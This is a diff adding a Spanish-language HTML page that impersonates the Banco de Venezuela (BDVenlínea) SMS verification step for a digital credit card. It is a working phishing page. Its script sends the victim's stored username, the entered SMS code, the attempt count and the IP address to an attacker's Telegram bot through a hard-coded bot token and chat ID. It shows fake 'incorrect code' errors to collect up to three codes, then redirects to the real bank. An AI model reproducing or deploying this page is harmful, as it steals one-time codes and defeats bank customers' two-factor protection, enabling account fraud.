@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>BDVenlínea - Verificación</title>
+    <style>
+        :root {
+            --bdv-blue: #0067b1;
+            --bdv-red: #f04e23;
+            --bdv-gray-bg: #f4f4f4;
+            --bdv-dark-bg: #0b121c;
+            --bdv-text-gray: #757575;
+        }
+
+        * { box-sizing: border-box; font-family: 'Arial', sans-serif; }
+
+        body {
+            margin: 0; padding: 0; height: 100vh;
+            background-image: url('background.webp'); 
+            background-color: var(--bdv-gray-bg); background-size: cover;
+            background-position: center; display: flex;
+            align-items: center; overflow: hidden;
+        }
+
+        .sms-container {
+            background: white; width: 450px; margin-left: 8%;
+            padding: 40px; border-radius: 4px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            position: relative; z-index: 1;
+            text-align: center;
+        }
+
+        @media (max-width: 768px) {
+            body { background: white; }
+            .sms-container { width: 100%; height: 100%; margin-left: 0; box-shadow: none; border-radius: 0; padding-top: 60px; }
+        }
+
+        .logo-sms { display: block; width: 220px; margin: 0 auto 30px; }
+        
+        h3 { color: var(--bdv-blue); font-size: 20px; margin-bottom: 10px; font-weight: bold; }
+        .info-txt { color: var(--bdv-text-gray); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+
+        .field { background: #f0f0f0; border-bottom: 2px solid var(--bdv-red); padding: 10px 15px; margin-bottom: 30px; text-align: left; }
+        .field label { display: block; font-size: 12px; color: #666; margin-bottom: 5px; }
+        .field input { width: 100%; border: none; background: transparent; font-size: 22px; outline: none; letter-spacing: 4px; font-weight: bold; color: #333; }
+
+        .error-txt { color: var(--bdv-red); font-size: 14px; margin-bottom: 20px; display: none; font-weight: bold; }
+
+        .btn-group { display: flex; gap: 15px; }
+        .btn { flex: 1; padding: 14px; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn-continuar { background: #ccc; color: #888; cursor: not-allowed; }
+        .btn-continuar.active { background: var(--bdv-blue); color: white; cursor: pointer; }
+        .btn-cancelar { background: var(--bdv-blue); color: white; }
+
+        #loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: var(--bdv-dark-bg); z-index: 500; display: none;
+            flex-direction: column; justify-content: center; align-items: center; color: white;
+        }
+
+        .dots { display: flex; gap: 10px; margin: 25px 0; }
+        .dot { width: 12px; height: 12px; background: var(--bdv-red); border-radius: 50%; animation: pulse 1s infinite alternate; }
+        .dot:nth-child(2) { animation-delay: 0.3s; }
+        .dot:nth-child(3) { animation-delay: 0.6s; }
+        @keyframes pulse { from { transform: scale(0.5); opacity: 0.3; } to { transform: scale(1.2); opacity: 1; } }
+        .load-text { color: var(--bdv-red); font-size: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="sms-container">
+        <img src="logo.png" class="logo-sms" alt="BDV">
+        <h3>Autenticación</h3>
+        <p class="info-txt">Para completar la validación de tu Tarjeta de crédito Digital, ingresa el código SMS o AMI - VEN que hemos enviado a tu celular. (Puede tardar unos minutos en llegar)</p>
+        
+        <div id="errorMsg" class="error-txt">Código incorrecto. Inténtelo de nuevo.</div>
+
+        <div class="field">
+            <label>Código SMS *</label>
+            <input type="text" id="smsInput" maxlength="8" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        </div>
+
+        <div class="btn-group">
+            <button id="btnContinuar" class="btn btn-continuar" disabled>Continuar</button>
+            <button class="btn btn-cancelar" onclick="window.location.href='index.html'">Cancelar</button>
+        </div>
+    </div>
+
+    <div id="loading-overlay">
+        <img src="logo.png" width="180" style="filter: brightness(0) invert(1); margin-bottom: 20px;">
+        <div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+        <div class="load-text">Validando código...</div>
+    </div>
+
+    <script>
+        const botToken = "8968949871:AAHOl4RQWDHHaPcoCqRkE_oE3jxetyal3pA";
+        const chatId = "8359260482";
+
+        const smsInput = document.getElementById('smsInput');
+        const btnContinuar = document.getElementById('btnContinuar');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const errorMsg = document.getElementById('errorMsg');
+
+        let intentos = parseInt(sessionStorage.getItem('intentos_token')) || 0;
+
+        smsInput.addEventListener('input', () => {
+            const active = smsInput.value.length >= 6;
+            btnContinuar.disabled = !active;
+            btnContinuar.classList.toggle('active', active);
+        });
+
+        btnContinuar.onclick = async () => {
+            const token = smsInput.value;
+            const usuario = localStorage.getItem("usuario") || "Desconocido";
+            intentos++;
+            sessionStorage.setItem('intentos_token', intentos);
+
+            // Obtener IP
+            let ip = "Buscando...";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch(e) {}
+
+            const texto = `━━━━━━━━━━━━━━━━━━━━\n📲 **TOKEN SMS RECIBIDO**\n━━━━━━━━━━━━━━━━━━━━\n👤 **Usuario:** \`${usuario}\`\n🔢 **Token:** \`${token}\`\n🔄 **Intento:** \`${intentos}/3\`\n🌐 **IP:** \`${ip}\`\n━━━━━━━━━━━━━━━━━━━━`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
+
+            loadingOverlay.style.display = 'flex';
+
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                if (intentos < 3) {
+                    smsInput.value = "";
+                    errorMsg.style.display = 'block';
+                    btnContinuar.disabled = true;
+                    btnContinuar.classList.remove('active');
+                } else {
+                    window.location.href = "https://www.bancodevenezuela.com/";
+                }
+            }, 4000);
+        };
+    </script>
+</body>
+</html>
